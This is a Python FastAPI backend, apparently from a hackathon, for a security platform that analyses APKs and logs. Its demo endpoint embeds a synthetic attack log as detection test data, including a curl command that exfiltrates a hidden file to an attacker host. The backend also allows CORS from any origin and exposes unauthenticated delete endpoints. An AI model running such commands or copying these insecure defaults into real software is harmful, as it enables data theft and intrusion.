"""
RAKSHAK v4 — FastAPI REST Backend
AI-Driven Cyber Resilience for Critical National Infrastructure (PS7)
DRDO Cybersecurity Division · ET AI Hackathon 2026
"""

import os, json, uuid, shutil
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional

from fastapi import FastAPI, File, UploadFile, HTTPException, BackgroundTasks, Form, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles   import StaticFiles
from fastapi.responses     import HTMLResponse, FileResponse, JSONResponse
from pydantic              import BaseModel

from config         import UPLOAD_DIR, REPORT_DIR, STATIC_DIR, MAX_APK_SIZE_MB
from core.pipeline  import RakshakPipeline

# ─── RAKSHAK v4 New Engine Imports ──────────────────────────────────────────────
from core.mitre_attck        import MITREMapper
from core.behavioural_engine import BehaviouralAnomalyEngine
from core.soar_engine        import SOARPlaybookEngine
from core.apk_log_generator  import APKLogGenerator

# ─── FastAPI App ────────────────────────────────────────────────────────────────
app = FastAPI(
    title       = "RAKSHAK v4 — AI Cyber Resilience Platform",
    description = "AI-Driven Cyber Resilience for Critical National Infrastructure · PS7 · DRDO",
    version     = "4.0.0",
    docs_url    = "/api/docs",
)

# ─── v4 Engine Singletons ────────────────────────────────────────────────────────
mitre_mapper  = MITREMapper()
soar_engine   = SOARPlaybookEngine()
apk_log_gen   = APKLogGenerator()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory job store (production: use Redis)
JOBS: dict[str, dict] = {}
pipeline = RakshakPipeline()


# ─── MODELS ─────────────────────────────────────────────────────────────────────
class QuestionRequest(BaseModel):
    case_id : str
    question: str


class QuestionResponse(BaseModel):
    case_id : str
    question: str
    answer  : str


# ─── ROUTES ─────────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    """Serve the RAKSHAK dashboard"""
    dashboard = STATIC_DIR / "dashboard.html"
    if dashboard.exists():
        return HTMLResponse(content=dashboard.read_text())
    return HTMLResponse(content="<h1>RAKSHAK v3.0 — Dashboard not built yet</h1>")


@app.get("/api/status")
async def status():
    return {
        "platform"       : "RAKSHAK v3.0",
        "status"         : "OPERATIONAL",
        "organisation"   : "DRDO Cybersecurity Division",
        "active_jobs"    : len([j for j in JOBS.values() if j.get("status") == "RUNNING"]),
        "total_analyses" : len(JOBS),
        "timestamp"      : datetime.now(timezone.utc).isoformat() + "Z",
    }


@app.post("/api/analyze")
async def analyze_apk(
    background_tasks: BackgroundTasks,
    file         : UploadFile = File(...),
    analyst_name : str = Form(default="RAKSHAK-AUTO"),
):
    """Upload and analyze an APK file"""

    # Validate file
    if not file.filename.lower().endswith(".apk"):
        raise HTTPException(status_code=400, detail="Only .apk files are accepted")

    content = await file.read()

    if len(content) > MAX_APK_SIZE_MB * 1024 * 1024:
        raise HTTPException(status_code=413,
                            detail=f"APK exceeds {MAX_APK_SIZE_MB}MB limit")

    # Check magic bytes
    if content[:4] != b'PK\x03\x04':
        raise HTTPException(status_code=400,
                            detail="Invalid APK — not a valid ZIP/APK file")

    # Generate case ID
    case_id  = f"RKSAK-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:8].upper()}"
    apk_path = UPLOAD_DIR / f"{case_id}.apk"

    with open(apk_path, "wb") as f:
        f.write(content)

    # Initialize job
    JOBS[case_id] = {
        "case_id"    : case_id,
        "apk_name"   : file.filename,
        "status"     : "QUEUED",
        "submitted"  : datetime.now(timezone.utc).isoformat() + "Z",
        "analyst"    : analyst_name,
        "result"     : None,
    }

    # Run analysis in background
    background_tasks.add_task(
        _run_analysis, case_id, str(apk_path), analyst_name
    )

    return {
        "case_id"   : case_id,
        "status"    : "QUEUED",
        "apk_name"  : file.filename,
        "message"   : "Analysis started — poll /api/result/{case_id} for results",
        "poll_url"  : f"/api/result/{case_id}",
    }


def _run_analysis(case_id: str, apk_path: str, analyst_name: str):
    """Background APK analysis task — v4: includes MITRE + UEBA + SOAR"""
    JOBS[case_id]["status"] = "RUNNING"
    try:
        # ── Core APK pipeline (v3.2) ──────────────────────────────────────────
        result = pipeline.analyze(
            apk_path     = apk_path,
            analyst_name = analyst_name,
            case_id      = case_id,
        )
        JOBS[case_id]["status"] = result.get("status", "COMPLETE")
        JOBS[case_id]["result"] = result

        # ── v4: MITRE ATT&CK mapping from APK permissions + strings ──────────
        try:
            permissions = result.get("manifest", {}).get("permissions", []) + \
                          result.get("manifest", {}).get("dangerous_permissions", [])
            mitre_result = mitre_mapper.map_apk(
                permissions,
                result.get("strings"),
                result.get("static_analysis"),
            )
            result["mitre_attck"] = mitre_result
        except Exception as e:
            result["mitre_attck"] = {"error": str(e)}

        # ── v4: UEBA on any network/log data embedded in result ───────────────
        try:
            # Generate a brief activity log from APK IOCs for UEBA scoring
            gen_result = apk_log_gen.generate(result, log_duration_minutes=30)
            log_text   = gen_result.get("log_text", "")
            if log_text:
                ueba_engine  = BehaviouralAnomalyEngine()
                ueba_result  = ueba_engine.analyze(log_text)
                result["behavioural_anomalies"] = ueba_result
                result["generated_log_preview"] = gen_result
        except Exception as e:
            result["behavioural_anomalies"] = {"error": str(e)}

        # ── v4: SOAR auto-response ─────────────────────────────────────────────
        try:
            soar_result = _run_soar(
                case_id,
                result,
                result.get("mitre_attck", {}),
                result.get("behavioural_anomalies", {}),
            )
            result["soar_response"] = soar_result
        except Exception as e:
            result["soar_response"] = {"error": str(e)}

        JOBS[case_id]["result"] = result

        # Persist result to disk
        report_path = REPORT_DIR / f"{case_id}.json"
        with open(report_path, "w") as f:
            json.dump(result, f, indent=2, default=str)

    except Exception as e:
        import traceback
        JOBS[case_id]["status"] = "ERROR"
        JOBS[case_id]["error"]  = str(e)
        JOBS[case_id]["trace"]  = traceback.format_exc()


@app.get("/api/result/{case_id}")
async def get_result(case_id: str):
    """Poll analysis result"""
    if case_id not in JOBS:
        # Try loading from disk
        report_path = REPORT_DIR / f"{case_id}.json"
        if report_path.exists():
            return JSONResponse(content=json.loads(report_path.read_text()))
        raise HTTPException(status_code=404, detail=f"Case {case_id} not found")

    job = JOBS[case_id]
    if job["status"] in ("QUEUED", "RUNNING"):
        return {
            "case_id": case_id,
            "status" : job["status"],
            "message": "Analysis in progress — please wait",
            "progress": job.get("result", {}).get("progress", []),
        }
    return job.get("result") or {"case_id": case_id, "status": job["status"]}


@app.get("/api/jobs")
async def list_jobs():
    """List all analysis jobs"""
    return {
        "total": len(JOBS),
        "jobs" : [
            {
                "case_id"  : case_id,
                "apk_name" : job["apk_name"],
                "status"   : job["status"],
                "submitted": job["submitted"],
                "risk_score": job.get("result", {}).get("risk_score", {}).get("final_score"),
                "severity"  : job.get("result", {}).get("risk_score", {}).get("severity"),
            }
            for case_id, job in sorted(JOBS.items(), reverse=True)
        ]
    }


@app.post("/api/question", response_model=QuestionResponse)
async def analyst_question(req: QuestionRequest):
    """Analyst Q&A — ask Claude about a completed analysis"""
    job = JOBS.get(req.case_id)
    if not job:
        report_path = REPORT_DIR / f"{req.case_id}.json"
        if report_path.exists():
            analysis = json.loads(report_path.read_text())
        else:
            raise HTTPException(status_code=404, detail="Case not found")
    else:
        analysis = job.get("result")
        if not analysis:
            raise HTTPException(status_code=400, detail="Analysis not yet complete")

    answer = pipeline.answer_question(req.question, analysis)
    return QuestionResponse(
        case_id  = req.case_id,
        question = req.question,
        answer   = answer,
    )


@app.get("/api/report/{case_id}")
async def download_report(case_id: str):
    """Download full JSON report"""
    report_path = REPORT_DIR / f"{case_id}.json"
    if not report_path.exists():
        # Try from in-memory
        job = JOBS.get(case_id)
        if job and job.get("result"):
            with open(report_path, "w") as f:
                json.dump(job["result"], f, indent=2, default=str)
        else:
            raise HTTPException(status_code=404, detail="Report not found")
    return FileResponse(
        path        = str(report_path),
        filename    = f"RAKSHAK-{case_id}-report.json",
        media_type  = "application/json",
    )


@app.delete("/api/case/{case_id}")
async def delete_case(case_id: str):
    """Remove a case and associated files"""
    if case_id in JOBS:
        del JOBS[case_id]
    apk_path    = UPLOAD_DIR / f"{case_id}.apk"
    report_path = REPORT_DIR / f"{case_id}.json"
    for p in [apk_path, report_path]:
        if p.exists():
            p.unlink()
    return {"message": f"Case {case_id} deleted"}


# ─── ENTRY POINT ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    print("=" * 60)
    print("  RAKSHAK APK Threat Intelligence Platform v3.0")
    print("  DRDO Cybersecurity Division")
    print("=" * 60)
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)


# ─── ADDITIONAL ENDPOINTS ─────────────────────────────────────────────────────

@app.get("/api/report/{case_id}/pdf")
async def download_pdf_report(case_id: str):
    """Generate and download PDF forensic report"""
    from core.report_engine import generate_pdf_report

    job = JOBS.get(case_id)
    if not job:
        from database.db import get_case
        result = get_case(case_id)
    else:
        result = job.get("result")

    if not result:
        raise HTTPException(status_code=404, detail="Case not found or analysis not complete")

    pdf_path = str(REPORT_DIR / f"{case_id}-technical.pdf")
    if not Path(pdf_path).exists():
        try:
            pdf_path = generate_pdf_report(result, str(REPORT_DIR))
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"PDF generation failed: {e}")

    return FileResponse(
        path       = pdf_path,
        filename   = f"RAKSHAK-{case_id}-forensic-report.pdf",
        media_type = "application/pdf",
    )


@app.get("/api/report/{case_id}/stix")
async def export_stix(case_id: str):
    """Export analysis as STIX 2.1 threat intelligence bundle"""
    from core.stix_exporter import export_stix as _export

    job = JOBS.get(case_id)
    result = job.get("result") if job else None
    if not result:
        from database.db import get_case
        result = get_case(case_id)
    if not result:
        raise HTTPException(status_code=404, detail="Case not found")

    bundle = _export(result)
    stix_path = REPORT_DIR / f"{case_id}-stix.json"
    stix_path.write_text(json.dumps(bundle, indent=2))

    return FileResponse(
        path       = str(stix_path),
        filename   = f"RAKSHAK-{case_id}-stix21.json",
        media_type = "application/json",
    )


@app.post("/api/network/{case_id}")
async def run_network_analysis(case_id: str):
    """Run network IOC enrichment on a completed analysis"""
    from core.network_analyzer import NetworkAnalyzer

    job = JOBS.get(case_id)
    result = job.get("result") if job else None
    if not result:
        from database.db import get_case
        result = get_case(case_id)
    if not result:
        raise HTTPException(status_code=404, detail="Case not found")

    strings = result.get("strings", {})
    analyzer = NetworkAnalyzer(timeout=6)
    net_result = analyzer.analyze(
        urls = strings.get("urls", []),
        ips  = strings.get("ips",  []),
    )
    if job:
        if job.get("result"):
            job["result"]["network_analysis"] = net_result
    return net_result


@app.get("/api/stats")
async def platform_stats():
    """Platform-wide statistics from database"""
    from database.db import get_stats
    db_stats = get_stats()
    return {
        **db_stats,
        "active_jobs"    : len([j for j in JOBS.values() if j.get("status") == "RUNNING"]),
        "in_memory_jobs" : len(JOBS),
        "platform"       : "RAKSHAK v3.0.0",
        "timestamp"      : datetime.now(timezone.utc).isoformat() + "Z",
    }


@app.get("/api/cases")
async def list_all_cases(limit: int = 50):
    """List cases from persistent database"""
    from database.db import list_cases
    return {"cases": list_cases(limit=limit)}


@app.get("/api/ioc/search")
async def search_ioc(q: str):
    """Search IOC value across all cases"""
    from database.db import search_ioc as _search
    return {"results": _search(q)}


# ─── WEBSOCKET REAL-TIME STREAMING ───────────────────────────────────────────
from fastapi import WebSocket, WebSocketDisconnect
from core.ws_server import ws_manager
from core.event_bus import event_bus


@app.websocket("/ws/analysis/{case_id}")
async def ws_analysis(websocket: WebSocket, case_id: str):
    """Per-case WebSocket — streams all events for a specific analysis."""
    await ws_manager.connect(websocket, case_id=case_id)


@app.websocket("/ws/global")
async def ws_global(websocket: WebSocket):
    """Global WebSocket — receives ALL analysis events across all cases."""
    await ws_manager.connect(websocket, case_id=None)


@app.get("/api/events/{case_id}")
async def get_event_history(case_id: str):
    """Replay all recorded events for a case (for dashboard catch-up)."""
    return {"case_id": case_id, "events": event_bus.get_history(case_id)}


@app.post("/api/analyze/advanced")
async def analyze_advanced(
    background_tasks: BackgroundTasks,
    file          : UploadFile = File(...),
    analyst_name  : str = Form(default="RAKSHAK-AUTO"),
    enable_dynamic: bool = Form(default=True),
    enable_network: bool = Form(default=True),
    enable_misp   : bool = Form(default=False),
):
    """Advanced analysis endpoint using all 11 engines with real-time streaming."""
    if not file.filename.lower().endswith(".apk"):
        raise HTTPException(400, "Only .apk files accepted")
    content = await file.read()
    if len(content) > MAX_APK_SIZE_MB * 1024 * 1024:
        raise HTTPException(413, f"APK exceeds {MAX_APK_SIZE_MB}MB")
    if content[:4] != b'PK\x03\x04':
        raise HTTPException(400, "Invalid APK file")

    import uuid
    case_id  = f"RKSAK-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:8].upper()}"
    apk_path = UPLOAD_DIR / f"{case_id}.apk"
    with open(apk_path, "wb") as f:
        f.write(content)

    JOBS[case_id] = {
        "case_id"  : case_id,
        "apk_name" : file.filename,
        "status"   : "QUEUED",
        "submitted": datetime.now(timezone.utc).isoformat() + "Z",
        "analyst"  : analyst_name,
        "result"   : None,
    }

    def _run():
        JOBS[case_id]["status"] = "RUNNING"
        try:
            from core.advanced_pipeline import AdvancedPipeline
            from database.db import save_case
            result = AdvancedPipeline().analyze(
                str(apk_path), analyst_name, case_id,
                enable_dynamic=enable_dynamic,
                enable_network=enable_network,
                enable_misp   =enable_misp,
            )
            JOBS[case_id]["status"] = result.get("status","COMPLETE")
            JOBS[case_id]["result"] = result
            save_case(result)
            report_path = REPORT_DIR / f"{case_id}.json"
            report_path.write_text(json.dumps(result, indent=2, default=str))
        except Exception as e:
            JOBS[case_id]["status"] = "ERROR"
            JOBS[case_id]["error"]  = str(e)

    background_tasks.add_task(_run)
    return {
        "case_id"  : case_id,
        "status"   : "QUEUED",
        "apk_name" : file.filename,
        "ws_url"   : f"/ws/analysis/{case_id}",
        "poll_url" : f"/api/result/{case_id}",
        "message"  : "Connect WebSocket to receive real-time events",
    }


# ═══════════════════════════════════════════════════════════════
# LOG ANALYSIS ENDPOINTS
# ═══════════════════════════════════════════════════════════════

@app.post("/api/analyze/logs")
async def analyze_logs(
    background_tasks: BackgroundTasks,
    file         : UploadFile = File(...),
    analyst_name : str = Form(default="RAKSHAK-AUTO"),
):
    """
    Upload a log file for DRDO-grade security incident analysis.
    Supports: auth.log, syslog, Apache/Nginx access logs, Windows Event logs.
    Returns real-time events via WebSocket + final JSON + PDF report.
    """
    content = await file.read()
    if len(content) > 50 * 1024 * 1024:   # 50MB max
        raise HTTPException(413, "Log file exceeds 50MB limit")

    try:
        log_text = content.decode("utf-8", errors="replace")
    except Exception:
        raise HTTPException(400, "Could not decode log file — ensure it is text/UTF-8")

    import uuid
    case_id  = f"LOG-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:8].upper()}"

    JOBS[case_id] = {
        "case_id"  : case_id,
        "log_name" : file.filename,
        "type"     : "LOG_ANALYSIS",
        "status"   : "QUEUED",
        "submitted": datetime.now(timezone.utc).isoformat(),
        "analyst"  : analyst_name,
        "result"   : None,
    }

    def _run():
        JOBS[case_id]["status"] = "RUNNING"
        try:
            from core.log_analyzer    import SecurityLogAnalyzer
            from core.incident_report import generate_incident_report
            from database.db          import save_case

            analyzer = SecurityLogAnalyzer()
            result   = analyzer.analyze(log_text, file.filename, case_id)
            result["case_id"]  = case_id
            result["analyst"]  = analyst_name
            result["log_name"] = file.filename

            # ── v4: MITRE ATT&CK mapping ─────────────────────────────────────
            try:
                mitre_result = mitre_mapper.map_logs(log_text)
                result["mitre_attck"] = mitre_result
            except Exception as e:
                result["mitre_attck"] = {"error": str(e)}

            # ── v4: UEBA behavioural anomaly detection ────────────────────────
            try:
                ueba_engine = BehaviouralAnomalyEngine()
                ueba_result = ueba_engine.analyze(log_text)
                result["behavioural_anomalies"] = ueba_result
                # Merge UEBA risk into overall score
                ueba_risk = ueba_result.get("global_risk_score", 0)
                current   = result.get("risk_score", 0)
                if isinstance(current, dict):
                    current = current.get("final_score", 0)
                result["risk_score"] = max(current, ueba_risk)
            except Exception as e:
                result["behavioural_anomalies"] = {"error": str(e)}

            # ── v4: SOAR autonomous response ──────────────────────────────────
            try:
                soar_result = _run_soar(
                    case_id,
                    result,
                    result.get("mitre_attck", {}),
                    result.get("behavioural_anomalies", {}),
                )
                result["soar_response"] = soar_result
            except Exception as e:
                result["soar_response"] = {"error": str(e)}

            # Generate PDF
            pdf_path = generate_incident_report(result, str(REPORT_DIR), case_id)
            result["pdf_path"] = pdf_path

            JOBS[case_id]["status"] = "COMPLETE"
            JOBS[case_id]["result"] = result

            # Save to DB
            save_case({
                "case_id"      : case_id,
                "apk_name"     : f"[LOG] {file.filename}",
                "hashes"       : {"sha256": "", "md5": "", "size_human": ""},
                "risk_score"   : {"final_score": result.get("risk_score", 0),
                                  "severity": result.get("risk_level", "LOW")},
                "status"       : "COMPLETE",
                "duration_sec" : 0,
                "analyst"      : analyst_name,
                "summary"      : {
                    "risk_score"    : result.get("risk_score", 0),
                    "severity"      : result.get("risk_level", "LOW"),
                    "total_findings": len(result.get("findings", [])),
                },
            })

        except Exception as e:
            import traceback
            JOBS[case_id]["status"] = "ERROR"
            JOBS[case_id]["error"]  = str(e)
            JOBS[case_id]["trace"]  = traceback.format_exc()

    background_tasks.add_task(_run)
    return {
        "case_id"  : case_id,
        "status"   : "QUEUED",
        "log_name" : file.filename,
        "ws_url"   : f"/ws/analysis/{case_id}",
        "poll_url" : f"/api/log/result/{case_id}",
        "pdf_url"  : f"/api/log/report/{case_id}/pdf",
        "message"  : "Log analysis started — connect WebSocket for real-time events",
    }


@app.get("/api/log/result/{case_id}")
async def get_log_result(case_id: str):
    """Poll log analysis result."""
    job = JOBS.get(case_id)
    if not job:
        raise HTTPException(404, "Case not found")
    if job["status"] == "COMPLETE":
        return job["result"]
    return {"case_id": case_id, "status": job["status"],
            "error": job.get("error")}


@app.get("/api/log/report/{case_id}/pdf")
async def download_log_pdf(case_id: str):
    """Download the incident report PDF for a log analysis."""
    job = JOBS.get(case_id)
    if not job or job["status"] != "COMPLETE":
        raise HTTPException(404, "Report not ready — analysis still running or not found")
    pdf_path = job.get("result", {}).get("pdf_path", "")
    if not pdf_path or not Path(pdf_path).exists():
        # Regenerate
        from core.incident_report import generate_incident_report
        pdf_path = generate_incident_report(job["result"], str(REPORT_DIR), case_id)
    return FileResponse(
        path       = pdf_path,
        filename   = f"RAKSHAK-INCIDENT-{case_id}.pdf",
        media_type = "application/pdf",
    )


@app.post("/api/log/demo")
async def run_demo_log_analysis():
    """Run a demo log analysis with synthetic DRDO attack scenario — no file upload needed."""
    import uuid
    from core.log_analyzer    import SecurityLogAnalyzer
    from core.incident_report import generate_incident_report

    demo_log = """Jan 15 10:23:01 server sshd[1234]: Failed password for root from 185.220.101.45 port 22 ssh2
Jan 15 10:23:03 server sshd[1234]: Failed password for admin from 185.220.101.45 port 22 ssh2
Jan 15 10:23:05 server sshd[1234]: Failed password for user from 185.220.101.45 port 22 ssh2
Jan 15 10:23:07 server sshd[1234]: Failed password for root from 185.220.101.45 port 22 ssh2
Jan 15 10:23:09 server sshd[1234]: Failed password for ubuntu from 185.220.101.45 port 22 ssh2
Jan 15 10:23:11 server sshd[1234]: Failed password for test from 185.220.101.45 port 22 ssh2
Jan 15 10:25:00 server sshd[1235]: Failed password for root from 45.33.32.156 port 22 ssh2
Jan 15 10:25:02 server sshd[1235]: Failed password for admin from 45.33.32.156 port 22 ssh2
Jan 15 10:30:00 server sshd[1236]: Accepted password for drdo_user from 185.220.101.45 port 22 ssh2
Jan 15 10:35:00 server sudo: drdo_user : TTY=pts/0 ; PWD=/home/drdo_user ; USER=root ; COMMAND=/bin/bash
Jan 15 10:38:00 server audit[1300]: type=PATH msg=audit(1736935080.0): item=0 name="/var/log/auth.log" inode=123456 nametype=DELETE
Jan 15 10:40:00 server kernel: DROP IN=eth0 SRC=185.220.101.45 DST=10.0.0.1 PROTO=TCP DPT=4444
Jan 15 10:45:00 server httpd: 185.220.101.45 - - [15/Jan/2026:10:45:00 +0000] "GET /wp-admin/ HTTP/1.1" 403 0
Jan 15 10:45:01 server httpd: 185.220.101.45 - - [15/Jan/2026:10:45:01 +0000] "GET /.env HTTP/1.1" 404 0
Jan 15 10:45:02 server httpd: 185.220.101.45 - - [15/Jan/2026:10:45:02 +0000] "GET /etc/passwd HTTP/1.1" 404 0
Jan 15 10:50:00 server named: DNS QUERY update.sys-cloud.net TXT from 10.0.0.50
Jan 15 11:00:00 server cron[1500]: (drdo_user) CMD (curl -s -X POST https://update.sys-cloud.net/upload -d @/tmp/.data123)
Jan 15 11:10:00 server sshd[1600]: Accepted publickey for drdo_user from 10.0.0.51 port 22 ssh2
Jan 15 11:20:00 server sudo: drdo_user : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
Jan 15 11:25:00 server audit[1700]: type=SYSCALL msg=audit(1736935500.0): syscall=87 success=yes exe="/bin/rm" key="log_deletion"
"""

    case_id  = f"LOG-DEMO-{uuid.uuid4().hex[:6].upper()}"
    analyzer = SecurityLogAnalyzer()
    result   = analyzer.analyze(demo_log, "demo_drdo_attack.log", case_id)
    result["case_id"]  = case_id
    result["log_name"] = "demo_drdo_attack.log"
    result["analyst"]  = "DRDO-DEMO"

    # ── v4: MITRE ATT&CK ─────────────────────────────────────────────────────
    try:
        mitre_result = mitre_mapper.map_logs(demo_log)
        result["mitre_attck"] = mitre_result
    except Exception as e:
        result["mitre_attck"] = {"error": str(e)}

    # ── v4: UEBA ─────────────────────────────────────────────────────────────
    try:
        ueba_engine = BehaviouralAnomalyEngine()
        ueba_result = ueba_engine.analyze(demo_log)
        result["behavioural_anomalies"] = ueba_result
        ueba_risk = ueba_result.get("global_risk_score", 0)
        current   = result.get("risk_score", 0)
        result["risk_score"] = max(current, ueba_risk)
    except Exception as e:
        result["behavioural_anomalies"] = {"error": str(e)}

    # ── v4: SOAR ─────────────────────────────────────────────────────────────
    try:
        soar_result = _run_soar(case_id, result,
                                result.get("mitre_attck", {}),
                                result.get("behavioural_anomalies", {}))
        result["soar_response"] = soar_result
    except Exception as e:
        result["soar_response"] = {"error": str(e)}

    pdf_path = generate_incident_report(result, str(REPORT_DIR), case_id)
    result["pdf_path"] = pdf_path

    JOBS[case_id] = {"status": "COMPLETE", "result": result}
    return {
        "case_id" : case_id,
        "result"  : result,
        "pdf_url" : f"/api/log/report/{case_id}/pdf",
        "message" : "Demo analysis complete — MITRE ATT&CK + UEBA + SOAR included",
    }


@app.post("/api/log/correlate")
async def correlate_logs(files: list[UploadFile] = File(...)):
    """
    Correlate multiple log sources simultaneously.
    Detects full attack chains visible only across multiple files.
    """
    from core.multi_log_correlator import MultiLogCorrelator

    sources = {}
    for upload in files[:4]:
        try:
            content = await upload.read()
            # filename format: "type:originalname"
            name_parts = upload.filename.split(":", 1)
            src_key    = name_parts[0] if len(name_parts) > 1 else upload.filename
            sources[src_key] = content.decode("utf-8", errors="replace")
        except Exception:
            pass

    if not sources:
        raise HTTPException(400, "No valid log files provided")

    correlator = MultiLogCorrelator()
    result     = correlator.correlate(sources, time_window_sec=300)
    return result


# ══════════════════════════════════════════════════════════════════════════════
# ADVANCED MODULE ENDPOINTS v3.2
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/api/log/analyze/dns")
async def analyze_dns_logs(file: UploadFile = File(...)):
    """DNS log analysis — tunneling, DGA, fast flux detection."""
    from core.dns_analyzer import DNSAnalyzer
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = DNSAnalyzer().analyze(content)
    return result


@app.post("/api/log/analyze/database")
async def analyze_database_logs(file: UploadFile = File(...),
                                 db_type: str = "auto"):
    """Database audit log analysis — SQLi, dumps, privilege abuse."""
    from core.db_log_analyzer import DatabaseLogAnalyzer
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = DatabaseLogAnalyzer().analyze(content, db_type)
    return result


@app.post("/api/log/analyze/uba")
async def analyze_user_behaviour(file: UploadFile = File(...)):
    """User Behaviour Analytics — impossible travel, insider threat, privilege creep."""
    from core.uba_engine import UBAEngine
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = UBAEngine().analyze(content)
    return result


@app.post("/api/log/analyze/beaconing")
async def detect_beaconing(file: UploadFile = File(...)):
    """C2 beaconing detection via statistical periodicity analysis."""
    from core.beaconing_detector import BeaconingDetector
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = BeaconingDetector().analyze(content)
    return result


@app.post("/api/log/analyze/email")
async def analyze_email_logs(file: UploadFile = File(...)):
    """Email server log analysis — BEC, phishing, silent forwarding, ATO."""
    from core.email_log_analyzer import EmailLogAnalyzer
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = EmailLogAnalyzer().analyze(content)
    return result


@app.post("/api/log/analyze/cloud")
async def analyze_cloud_trail(file: UploadFile = File(...)):
    """Cloud trail analysis — AWS CloudTrail, Azure Activity, GCP Audit logs."""
    from core.cloud_trail_analyzer import CloudTrailAnalyzer
    content = (await file.read()).decode("utf-8", errors="replace")
    result  = CloudTrailAnalyzer().analyze(content)
    return result


@app.get("/api/log/sigma/{case_id}")
async def get_sigma_rules(case_id: str):
    """Download auto-generated Sigma rules for a case as YAML."""
    from core.sigma_generator import SigmaGenerator
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, f"Case {case_id} not found or not complete")
    result = job.get("result", {})
    sigma  = result.get("sigma_rules", {})
    if not sigma or not sigma.get("rules_generated"):
        raise HTTPException(404, "No Sigma rules generated for this case")
    yaml_content = "\n---\n".join(r["yaml"] for r in sigma["rules_generated"])
    return Response(
        content=yaml_content,
        media_type="text/yaml",
        headers={"Content-Disposition": f"attachment; filename=RAKSHAK_{case_id}_sigma.yml"}
    )


@app.get("/api/log/certin/{case_id}")
async def get_certin_report(case_id: str):
    """Download auto-generated CERT-In Form IR-1 as JSON."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, f"Case {case_id} not found")
    certin = job.get("result", {}).get("cert_in_report", {})
    if not certin:
        raise HTTPException(404, "No CERT-In report for this case")
    return certin


@app.get("/api/log/timeline/{case_id}")
async def get_forensic_timeline(case_id: str):
    """Get forensic timeline + Section 65B digital evidence package."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, f"Case {case_id} not found")
    timeline = job.get("result", {}).get("forensic_timeline", {})
    if not timeline:
        raise HTTPException(404, "No forensic timeline for this case")
    return timeline


@app.get("/api/log/apt/{case_id}")
async def get_apt_attribution(case_id: str):
    """Get APT threat actor attribution and predicted next steps."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, f"Case {case_id} not found")
    ti = job.get("result", {}).get("threat_intel", {})
    return {
        "apt_attribution"   : ti.get("apt_attribution", []),
        "matched_ttps"      : ti.get("matched_ttps", []),
        "predicted_next"    : ti.get("predicted_next_steps", []),
        "ioc_correlation"   : ti.get("ioc_correlation", []),
        "ti_risk_score"     : ti.get("ti_risk_score", 0),
    }


@app.get("/api/advanced/summary")
async def advanced_summary():
    """Summary of all advanced modules available in RAKSHAK v3.2."""
    return {
        "version"     : "3.2",
        "modules"     : [
            {"id": "dns",      "name": "DNS Analyzer",           "endpoint": "/api/log/analyze/dns",      "detects": ["DNS tunneling","DGA domains","Fast flux"]},
            {"id": "db",       "name": "Database Log Analyzer",  "endpoint": "/api/log/analyze/database", "detects": ["SQL injection","Data dumps","Privilege abuse"]},
            {"id": "uba",      "name": "UBA Engine",             "endpoint": "/api/log/analyze/uba",      "detects": ["Impossible travel","Insider threat","Privilege creep"]},
            {"id": "beacon",   "name": "Beaconing Detector",     "endpoint": "/api/log/analyze/beaconing","detects": ["C2 beaconing","Periodic connections","Malware heartbeat"]},
            {"id": "email",    "name": "Email Log Analyzer",     "endpoint": "/api/log/analyze/email",    "detects": ["BEC","Phishing","Silent forwarding","ATO"]},
            {"id": "cloud",    "name": "Cloud Trail Analyzer",   "endpoint": "/api/log/analyze/cloud",    "detects": ["IAM abuse","Security bypass","MFA disable","Data exfil"]},
            {"id": "sigma",    "name": "Sigma Generator",        "endpoint": "/api/log/sigma/{case_id}",  "detects": ["SIEM rule export","Splunk/QRadar/Elastic compatible"]},
            {"id": "certin",   "name": "CERT-In Reporter",       "endpoint": "/api/log/certin/{case_id}", "detects": ["Form IR-1","Auto-population","Legal compliance"]},
            {"id": "timeline", "name": "Forensic Timeline",      "endpoint": "/api/log/timeline/{case_id}","detects": ["Section 65B","SHA-256 sealed","Court evidence"]},
            {"id": "apt",      "name": "Threat Intel Fusion",    "endpoint": "/api/log/apt/{case_id}",    "detects": ["APT36","SideWinder","Lazarus","Volt Typhoon"]},
        ],
        "developer"   : "Mohan Sriram Kunamsetty — QIS College of Engineering, Ongole, AP",
        "github"      : "github.com/SriRamkunamsetty/RAKSHAK",
    }



# ══════════════════════════════════════════════════════════════════════════════
# RAKSHAK v4 NEW ENDPOINTS — PS7 COMPLIANCE
# ══════════════════════════════════════════════════════════════════════════════

# ── v4: Manual Log Input (text entry, no file required) ───────────────────────
class ManualLogRequest(BaseModel):
    log_text:    str
    log_type:    str = "auth"
    analyst_name:str = "RAKSHAK-AUTO"

@app.post("/api/v4/log/manual")
async def analyze_manual_log(req: ManualLogRequest, background_tasks: BackgroundTasks):
    """
    v4: Analyst pastes/types log content directly — no file upload needed.
    Supports: auth, syslog, web, network, custom
    """
    if not req.log_text or len(req.log_text.strip()) < 10:
        raise HTTPException(400, "Log text is empty or too short")
    if len(req.log_text) > 10 * 1024 * 1024:
        raise HTTPException(413, "Log text exceeds 10MB limit")

    case_id = f"LOG-MANUAL-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:8].upper()}"
